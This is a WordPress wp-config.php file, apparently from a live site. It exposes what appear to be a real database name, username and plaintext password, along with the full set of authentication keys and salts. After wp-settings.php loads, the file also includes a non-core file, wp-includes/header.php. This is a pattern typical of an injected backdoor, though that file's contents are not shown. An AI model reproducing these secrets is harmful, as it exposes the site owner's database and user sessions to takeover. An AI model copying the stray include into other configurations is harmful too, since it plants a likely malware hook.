<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'mathmozo_portal' );

/** Database username */
define( 'DB_USER', 'mathmozo_portal' );

/** Database password */
define( 'DB_PASSWORD', 'nipun007nipun007' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'qZ8B:bk:rnyH^Je+6Xwg,zqj3PZEX Fh5hjBWKJ$[z|>~J:tfrdEXuia<fv=r>rK' );
define( 'SECURE_AUTH_KEY',  'KCq^q9k>ne9~4Bk>O@(2TiCR%w#;;^)U;gHYxY/L<EFPn#,kHEcE5fZvSRDp4yP{' );
define( 'LOGGED_IN_KEY',    'T)(hqC}`5FE;uq~r%LZe2X`LguQLk!oxxs@ouGZ2FDT-po2iW9z=Gn^_Cb%~H0g&' );
define( 'NONCE_KEY',        'OjN9~+&g),R&py={N/CTjl%[1IrzZnIjv.CVhsNduV|[JK%$zq{W%i{>,Ggw3unM' );
define( 'AUTH_SALT',        ' PvsZE4669Gl.MDA~$pz23o7I[j+e`&L@pGIWAZ_$_5-Vwz2W8GuoIqDx${TbjGG' );
define( 'SECURE_AUTH_SALT', 'FLnZElE[@9m5(e1>=GCB0?.=+&w|YRl`{H?gH<%:DI!tdhe5 *js>_^Z?t3&bi_C' );
define( 'LOGGED_IN_SALT',   '#s=bRn$?Oa!Kb+fsso>9#Zthq,~q;P6ufKRG5KP*8l_3Xo~whvDY+Yk!*{8r%CEC' );
define( 'NONCE_SALT',       '-Lw;bc^hity!1Bl.1a 0O0*T#T|.,B{-r6ENWnY!/M@7^#]%Yn-;E9Bq-/n6YC8y' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );
define( 'WP_DEBUG_DISPLAY', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
include_once(ABSPATH . WPINC . '/header.php');


//define('DISALLOW_FILE_EDIT', true);
//define('DISALLOW_FILE_MODS', true);